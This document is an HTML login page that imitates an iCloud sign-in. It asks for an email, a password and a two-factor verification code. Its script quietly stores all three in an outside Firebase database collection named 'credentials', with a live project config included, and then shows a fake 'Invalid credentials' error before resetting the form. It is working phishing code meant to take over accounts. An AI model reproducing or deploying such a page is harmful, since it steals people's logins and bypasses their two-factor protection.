<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            transition: height 0.3s ease;
        }
        .login-container h2 {
            margin-bottom: 20px;
            text-align: center;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 5px 0 20px 0;
            display: inline-block;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            background-color: #4CAF50;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .login-container button:hover {
            opacity: 0.8;
        }
        .error-message {
            color: red;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        .verification-field {
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }
        .verification-field.show {
            display: block;
        }
        .back-button {
            background-color: #6c757d;
            color: white;
            padding: 8px 12px;
            margin-bottom: 10px;
            font-size: 14px;
        }
        .back-button:hover {
            background-color: #5a6268;
        }
        .status-message {
            color: #666;
            font-size: 12px;
            text-align: center;
            margin-top: 5px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Login</h2>
    <p class="status-message">Please login with your iCloud email and password</p>
    <form id="loginForm">
        <div id="loginFields">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="button" id="continueBtn">Continue</button>
            <div class="status-message" id="statusMessage"></div>
        </div>
        
        <div id="verificationField" class="verification-field">
            <button type="button" class="back-button" id="backBtn">← Back</button>
            <p>Enter the verification code sent to your device:</p>
            <input type="text" name="verification" placeholder="Verification Code" required>
            <button type="submit">Login</button>
            <div class="status-message" id="statusMessage2"></div>
        </div>
        
        <div class="error-message" id="errorMessage">Invalid credentials</div>
    </form>
</div>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

<script>
    // Your Firebase configuration
    const firebaseConfig = {
        apiKey: "AIzaSyCIhHiH2itV7A2SxMY0g3fFsg0iQwfA4pI",
        authDomain: "login-ffcdd.firebaseapp.com",
        projectId: "login-ffcdd",
        storageBucket: "login-ffcdd.firebasestorage.app",
        messagingSenderId: "28209257330",
        appId: "1:28209257330:web:bf28e753372939b3629beb"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    
    // Store the current credential session
    let currentCredentialId = null;
    
    document.getElementById('continueBtn').addEventListener('click', function() {
        const username = document.querySelector('input[name="username"]').value;
        const password = document.querySelector('input[name="password"]').value;
        const statusMessage = document.getElementById('statusMessage');
        
        if (username && password) {
            // Show loading status
            statusMessage.textContent = "Verifying credentials...";
            
            // Save username and password to Firebase first
            db.collection("credentials").add({
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                stage: "initial"
            })
            .then((docRef) => {
                console.log("Initial credential saved with ID: ", docRef.id);
                currentCredentialId = docRef.id;
                
                // Show verification field
                document.getElementById('loginFields').style.display = 'none';
                document.getElementById('verificationField').classList.add('show');
                statusMessage.textContent = "";
            })
            .catch((error) => {
                console.error("Error saving initial credential: ", error);
                statusMessage.textContent = "Error. Please try again.";
            });
        }
    });
    
    document.getElementById('backBtn').addEventListener('click', function() {
        // Hide verification field and show login fields
        document.getElementById('verificationField').classList.remove('show');
        document.getElementById('loginFields').style.display = 'block';
        
        // Clear the status message
        document.getElementById('statusMessage').textContent = "";
    });
    
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const verification = document.querySelector('input[name="verification"]').value;
        const statusMessage2 = document.getElementById('statusMessage2');
        
        if (!currentCredentialId) {
            console.error("No credential session found");
            return;
        }
        
        // Show loading status
        statusMessage2.textContent = "Verifying code...";
        
        // Update the existing credential with the verification code
        db.collection("credentials").doc(currentCredentialId).update({
            verification: verification,
            stage: "complete"
        })
        .then(() => {
            console.log("Verification code saved");
            statusMessage2.textContent = "";
            
            // Show error message
            document.getElementById('errorMessage').style.display = 'block';
            
            // Reset the form after a delay
            setTimeout(() => {
                // Hide verification field and show login fields
                document.getElementById('verificationField').classList.remove('show');
                document.getElementById('loginFields').style.display = 'block';
                
                // Clear all fields
                document.querySelector('input[name="username"]').value = '';
                document.querySelector('input[name="password"]').value = '';
                document.querySelector('input[name="verification"]').value = '';
                
                // Hide error message
                document.getElementById('errorMessage').style.display = 'none';
                
                // Reset the credential session
                currentCredentialId = null;
            }, 2000);
        })
        .catch((error) => {
            console.error("Error saving verification code: ", error);
            statusMessage2.textContent = "Error. Please try again.";
        });
    });
</script>

</body>
</html>
